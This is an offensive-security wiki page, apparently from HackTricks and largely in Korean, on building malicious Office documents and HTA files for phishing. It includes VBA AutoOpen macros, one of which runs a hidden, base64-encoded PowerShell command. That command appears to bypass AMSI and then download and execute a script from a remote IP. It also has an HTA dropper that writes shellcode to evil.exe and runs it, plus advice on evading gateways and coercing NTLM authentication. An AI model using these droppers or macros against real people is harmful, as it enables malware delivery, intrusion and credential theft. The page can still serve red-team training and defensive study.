# Phishing Files & Documents

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Office Documents

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성 검사를 수행합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 대한 데이터 구조 식별 형태로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경하여 파일 이름을 바꾸면 매크로 실행 기능을 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾸면 Microsoft Word에서 처리되며 매크로 실행이 가능합니다.\
같은 내부 구조와 메커니즘이 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하여 일부 Office 프로그램에서 실행될 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 파일이 원격 템플릿을 참조하는 경우 (파일 – 옵션 – 추가 기능 – 관리: 템플릿 – 이동) 매크로를 “실행”할 수 있습니다.

### 외부 이미지 로드

이동: _삽입 --> 빠른 부분 --> 필드_\
&#xNAN;_**카테고리**: 링크 및 참조, **필드 이름**: includePicture, 및 **파일 이름 또는 URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### 매크로 백도어

문서에서 임의의 코드를 실행하기 위해 매크로를 사용할 수 있습니다.

#### 자동 로드 함수

더 일반적일수록, AV가 이를 감지할 가능성이 높아집니다.

* AutoOpen()
* Document\_Open()

#### 매크로 코드 예제
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**파일 > 정보 > 문서 검사 > 문서 검사**로 이동하면 문서 검사기가 열립니다. **검사**를 클릭한 다음 **문서 속성 및 개인 정보** 옆의 **모두 제거**를 클릭합니다.

#### 문서 확장자

작업이 끝나면 **다른 이름으로 저장** 드롭다운에서 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경합니다.\
이렇게 하는 이유는 **`.docx`** 안에 매크로를 저장할 수 없고, 매크로 사용 가능 **`.docm`** 확장자에 대한 **낙인**이 있기 때문입니다(예: 썸네일 아이콘에 큰 `!`가 있고 일부 웹/이메일 게이트웨이가 이를 완전히 차단합니다). 따라서 이 **구식 `.doc` 확장자가 최선의 타협**입니다.

#### 악성 매크로 생성기

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 파일

HTA는 **HTML 및 스크립팅 언어(예: VBScript 및 JScript)**를 결합한 Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델의 제약 없이 "완전히 신뢰할 수 있는" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용하여 실행되며, 이는 일반적으로 **Internet Explorer**와 함께 **설치**되어 **`mshta`가 IE에 의존**하게 됩니다. 따라서 IE가 제거되면 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제화

여러 가지 방법으로 **NTLM 인증을 "원격으로" 강제화**할 수 있습니다. 예를 들어, 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(HTTP MitM도 가능?). 또는 피해자에게 **폴더를 열기만 해도 인증을 트리거하는 파일의 주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 아이디어와 더 많은 내용을 확인하세요:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM 릴레이

해시나 인증을 훔치는 것뿐만 아니라 **NTLM 릴레이 공격을 수행할 수 있다는 점을 잊지 마세요**:

* [**NTLM 릴레이 공격**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM 릴레이를 통한 인증서)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
